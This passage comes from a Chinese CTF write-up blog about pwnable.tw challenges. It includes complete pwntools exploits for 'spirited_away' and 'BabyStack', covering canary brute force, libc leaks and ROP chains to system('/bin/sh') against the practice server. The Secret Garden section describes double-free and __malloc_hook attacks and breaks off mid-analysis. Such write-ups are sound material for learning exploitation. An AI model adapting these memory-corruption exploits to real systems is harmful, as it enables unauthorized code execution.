<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                else &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; else &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./spirited_away&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10204)</span><br><span class="line">elf=ELF(&#x27;./spirited_away&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">main=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">ret=0x0804841e</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def survey(name,age,content,comment,choice):</span><br><span class="line">	io.recvuntil(&#x27; name: &#x27;,timeout=1)</span><br><span class="line">	io.send(name)</span><br><span class="line">	io.recvuntil(&#x27;age: &#x27;,timeout=1)</span><br><span class="line">	io.sendline(str(age))</span><br><span class="line">	io.recvuntil(&#x27;movie? &#x27;,timeout=1)</span><br><span class="line">	io.send(content)</span><br><span class="line">	io.recvuntil(&#x27;comment: &#x27;,timeout=1)</span><br><span class="line">	io.send(comment)</span><br><span class="line">	io.recvuntil(&#x27;comment? &lt;y/n&gt;: &#x27;,timeout=1)</span><br><span class="line">	io.sendline(choice)</span><br><span class="line"></span><br><span class="line">def survey2(age,content,choice):</span><br><span class="line">	io.recvuntil(&#x27;age: &#x27;,timeout=1)</span><br><span class="line">	io.sendline(str(age))</span><br><span class="line">	io.recvuntil(&#x27;movie? &#x27;,timeout=1)</span><br><span class="line">	io.send(content)</span><br><span class="line">	io.recvuntil(&#x27;comment? &lt;y/n&gt;: &#x27;,timeout=1)</span><br><span class="line">	io.sendline(choice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	io.recvuntil(&#x27; name: &#x27;)</span><br><span class="line">	io.send(&#x27;a&#x27;*0x3c)</span><br><span class="line">	io.recvuntil(&#x27;age: &#x27;)</span><br><span class="line">	io.sendline(str(20))</span><br><span class="line">	io.recvuntil(&#x27;movie? &#x27;)</span><br><span class="line">	io.send(&#x27;b&#x27;*0x38)</span><br><span class="line">	io.recvuntil(&#x27;comment: &#x27;)</span><br><span class="line">	io.send(&#x27;c&#x27;*0x3c)</span><br><span class="line">	io.recvuntil(&#x27;b&#x27;*0x38)</span><br><span class="line">	stack=u32(io.recv(4))-0x48-0x88+8</span><br><span class="line">	io.recv(4)</span><br><span class="line">	fflush=u32(io.recv(4))-11</span><br><span class="line">	libc_base=fflush-libc.symbols[&#x27;fflush&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	print(&#x27;stack&#x27;,hex(stack))	</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">	exit=libc_base+libc.symbols[&#x27;_exit&#x27;]</span><br><span class="line">	io.sendlineafter(&#x27;comment? &lt;y/n&gt;: &#x27;,&#x27;y&#x27;)</span><br><span class="line">	</span><br><span class="line">	for i in range(9):</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		survey(&#x27;a&#x27;*0x3c,20,p32(0)+p32(0x41)+p32(0)*0xe+p32(0)+p32(0x11)+p32(0)*3+p32(0x11),&#x27;c&#x27;*0x3c,&#x27;y&#x27;)</span><br><span class="line">	for i in range(90):</span><br><span class="line">		sleep(0.1)</span><br><span class="line">		survey2(20,&#x27;a&#x27;,&#x27;y&#x27;)</span><br><span class="line">	print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">	survey(&#x27;f1ag&#x27;,20,&#x27;A&#x27;,&#x27;a&#x27;*80+p32(1)+p32(stack+0x60),&#x27;y&#x27;)</span><br><span class="line">	io.sendafter(&#x27; name: &#x27;,&#x27;sh\x00\x00&#x27;+&#x27;a&#x27;*0x44+p32(stack)+p32(system)+p32(main)+p32(binsh),timeout=0.1)</span><br><span class="line">	io.sendlineafter(&#x27;age: &#x27;,str(20))</span><br><span class="line">	io.sendafter(&#x27;movie? &#x27;,&#x27;A&#x27;)</span><br><span class="line">	io.sendafter(&#x27;comment: &#x27;,&#x27;a&#x27;)</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendlineafter(&#x27;comment? &lt;y/n&gt;: &#x27;,&#x27;n&#x27;)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="8-BabyStack"><a href="#8-BabyStack" class="headerlink" title="8.BabyStack"></a>8.BabyStack</h3><p>这个题是我做到现在为止用到的技巧最多的一次，下面我们来逐一分析。</p>
<p>题目代码挺少，逻辑也挺简单,我们需要注意copy函数中的strcpy函数，<strong>我们知道strcpy函数遇到’\x00’才会停止，如果栈上数据都被填满，那么复制给a1后就会造成溢出</strong>。</p>
<p>那么我们如何使栈被填满呢？我们可以看到<strong>copy的参数src[128]和login的参数s[128]使用的是相同的栈地址</strong>，并且中间也没有其他函数会改变其栈的内容，所以我们可以填满login中的s[128]，这样在使用copy函数后就会造成溢出，覆盖掉返回地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall copy(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char src[128]; // [rsp+10h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  reads((unsigned __int8 *)src, 0x3Fu);</span><br><span class="line">  strcpy(a1, src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall login(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  char s[128]; // [rsp+10h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  reads((unsigned __int8 *)s, 0x7Fu);</span><br><span class="line">  v1 = strlen(s);</span><br><span class="line">  if ( strncmp(s, a1, v1) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  state = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rcx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  char v6[64]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  __int64 buf[2]; // [rsp+40h] [rbp-20h] BYREF</span><br><span class="line">  char v8[16]; // [rsp+50h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  random = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(random, buf, 0x10uLL);</span><br><span class="line">  v3 = addr;</span><br><span class="line">  v4 = buf[1];</span><br><span class="line">  *(_QWORD *)addr = buf[0];</span><br><span class="line">  v3[1] = v4;</span><br><span class="line">  close(random);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;&gt;&gt; &quot;, 3uLL);</span><br><span class="line">    _read_chk(0LL, v8, 16LL, 16LL);</span><br><span class="line">    if ( v8[0] == &#x27;2&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v8[0] == &#x27;3&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( state )</span><br><span class="line">        copy(v6);</span><br><span class="line">      else</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8[0] != &#x27;1&#x27; )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      if ( state )</span><br><span class="line">        state = 0;</span><br><span class="line">      else</span><br><span class="line">        login(buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !state )</span><br><span class="line">    exit(0);</span><br><span class="line">  memcmp(buf, addr, 0x10uLL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但由于程序保护全开，且没有能够输出栈上的值的功能，所以很难直接泄露出libc_base等其他地址。但我们发现<strong>login函数中有strncmp()，他比较的是a1和s是否相同也就是buf和s是否相同，s是我们的输入可控，buf可以利用前面的溢出，将栈上的值复制到buf及之后，并且可以比较的长度范围为0~0x7f，也就是说我们可以泄露0x7f大小的栈内的值，因此就可以拿到libc_base。</strong></p>
<p>我们需要输入正确的密码才能使用copy函数，但密码是个随机数，虽然可以利用strncmp()函数爆破，<strong>但因为发现有strlen()函数，我们输入第一个字节为’\x00’，这样strlen()会返回0，就可以直接绕过strncmp()。</strong></p>
<p>一开始我没有发现canary在哪，执行到最后爆出canary错误，<strong>查看汇编可以看到memcmp比较后，如果不为0则跳转到__stacj_chk_fail函数报错，因为memcmp()是不存在’\x00’截断的，所以需要我们必须爆破出密码。</strong></p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ABf1ag-blog\source_posts\pwnable-tw刷题记录\image-20211103201504616.png" alt="image-20211103201504616"></p>
<p>最后，在写rop的时候，<strong>需要用到p64()但发现p64()存在’\x00’，会截断，因此我采取从后往前写的措施，即先将最后的system的函数地址写入栈中，然后利用strcpy()函数会复值’\x00’的特性将p64的高两位地址置0</strong>，这样就能成功的写入rop。</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./babystack&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10205)</span><br><span class="line">elf=ELF(&#x27;./babystack&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_64.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def login(password):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendafter(&#x27;passowrd :&#x27;,password)</span><br><span class="line"></span><br><span class="line">def login2():</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">def copy(content):</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Copy :&#x27;,content)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f)</span><br><span class="line">	</span><br><span class="line">	copy(&#x27;a&#x27;*0x3e+&#x27;\x00&#x27;)</span><br><span class="line">	canary=&#x27;&#x27;</span><br><span class="line">	for j in range(0x10):</span><br><span class="line">		login2()</span><br><span class="line">		for i in range(0xff):</span><br><span class="line">			if i == 10 or i == 0:</span><br><span class="line">				continue	</span><br><span class="line">			login(canary+p8(i)+&#x27;\x00&#x27;)</span><br><span class="line">			if io.recvuntil(&#x27;!\n&#x27;)[-9:] == &#x27;uccess !\n&#x27;:</span><br><span class="line">				canary+=p8(i)</span><br><span class="line">				break</span><br><span class="line">	canary	</span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x47)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line">	payload=&#x27;aaaaaaaa&#x27;</span><br><span class="line">	for j in range(6):</span><br><span class="line">		login2()</span><br><span class="line">		for i in range(0xff):</span><br><span class="line">			if i == 10 or i == 0:</span><br><span class="line">				continue	</span><br><span class="line">			login(payload+p8(i)+&#x27;\x00&#x27;)</span><br><span class="line">			if io.recvuntil(&#x27;!\n&#x27;)[-9:] == &#x27;uccess !\n&#x27;:</span><br><span class="line">				payload+=p8(i)</span><br><span class="line">				break</span><br><span class="line">	IOsetbuf=u64(payload[-6:].ljust(8,&#x27;\x00&#x27;))-9</span><br><span class="line">	libc_base=IOsetbuf-libc.symbols[&#x27;_IO_file_setbuf&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">	print(&#x27;binsh&#x27;,hex(binsh))</span><br><span class="line">	pop_rdi=libc_base+libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()</span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*5+p32(system&amp;0xffffffff)+p16((system&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line">	</span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*4+&#x27;aaaaaaa&#x27;+&#x27;\n&#x27;)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line">	</span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*4+p32(binsh&amp;0xffffffff)+p16((binsh&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*3+&#x27;aaaaaaa&#x27;+&#x27;\n&#x27;)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">	login2()</span><br><span class="line">	login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*3+p32(pop_rdi&amp;0xffffffff)+p16((pop_rdi&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">	copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="9-Secret-Garden"><a href="#9-Secret-Garden" class="headerlink" title="9.Secret Garden"></a>9.Secret Garden</h3><p>题目的漏洞点挺简单的，就是free后指针未置0</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108110017579.png" alt="image-20211108110017579"></p>
<p>因此可以double free，打__malloc_hook指针，设置为onegadget，因为gadget需要满足一定的条件，由于栈中的数据不理想，利用realloc调栈也没有办法满足条件，所以在这里我们利用malloc错误时会调用<code>malloc_printerr</code>函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), 0))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = &quot;free(): invalid pointer&quot;;</span><br><span class="line">  errout:</span><br><span class="line">    if (!have_lock &amp;&amp; locked)</span><br><span class="line">      (void) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接着调用<code>__libc_message</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  /* Avoid using this arena in future.  We do not attempt to synchronize this</span><br><span class="line">     with anything else because we minimally want to ensure that __libc_message</span><br><span class="line">     gets its resources safely without stumbling on the current corruption.  */</span><br><span class="line">  if (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  if ((action &amp; 5) == 5)</span><br><span class="line">    __libc_message (action &amp; 2, &quot;%s\n&quot;, str);</span><br><span class="line">  else if (action &amp; 1)</span><br><span class="line">    &#123;</span><br><span class="line">      char buf[2 * sizeof (uintptr_t) + 1];</span><br><span class="line"></span><br><span class="line">      buf[sizeof (buf) - 1] = &#x27;\0&#x27;;</span><br><span class="line">      char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0);</span><br><span class="line">      while (cp &gt; buf)</span><br><span class="line">        *--cp = &#x27;0&#x27;;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; 2, &quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;,</span><br><span class="line">                      __libc_argv[0] ? : &quot;&lt;unknown&gt;&quot;, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  else if (action &amp; 2)</span><br><span class="line">    abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着调用<code>BEFORE_ABORT</code>，且定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">__libc_message (int do_abort, const char *fmt, ...)</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">  if (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      /* Kill the application.  */</span><br><span class="line">      abort ();</span><br><span class="line">    &#125;</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">#define BEFORE_ABORT		backtrace_and_maps</span><br></pre></td></tr></table></figure>

<p>因此又调用了<code>backtrace_and_maps</code>,函数调用了<code>__backtrace</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">backtrace_and_maps (int do_abort, bool written, int fd)</span><br><span class="line">&#123;</span><br><span class="line">  if (do_abort &gt; 1 &amp;&amp; written)</span><br><span class="line">    &#123;</span><br><span class="line">      void *addrs[64];</span><br><span class="line">#define naddrs (sizeof (addrs) / sizeof (addrs[0]))</span><br><span class="line">      int n = __backtrace (addrs, naddrs);#调用__backtrace</span><br><span class="line">      if (n &gt; 2)</span><br><span class="line">        &#123;</span><br><span class="line">#define strnsize(str) str, strlen (str)</span><br><span class="line">#define writestr(str) write_not_cancel (fd, str)</span><br><span class="line">          writestr (strnsize (&quot;======= Backtrace: =========\n&quot;));</span><br><span class="line">          __backtrace_symbols_fd (addrs + 1, n - 1, fd);</span><br><span class="line"></span><br><span class="line">          writestr (strnsize (&quot;======= Memory map: ========\n&quot;));</span><br><span class="line">          int fd2 = open_not_cancel_2 (&quot;/proc/self/maps&quot;, O_RDONLY);</span><br><span class="line">          char buf[1024];</span><br><span class="line">          ssize_t n2;</span><br><span class="line">          while ((n2 = read_not_cancel (fd2, buf, sizeof (buf))) &gt; 0)</span><br><span class="line">            if (write_not_cancel (fd, buf, n2) != n2)</span><br><span class="line">              break;</span><br><span class="line">          close_not_cancel_no_status (fd2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__backtrace</code>函数定义如下，发现其调用了<code>__libc_once (once, init);</code> </p>
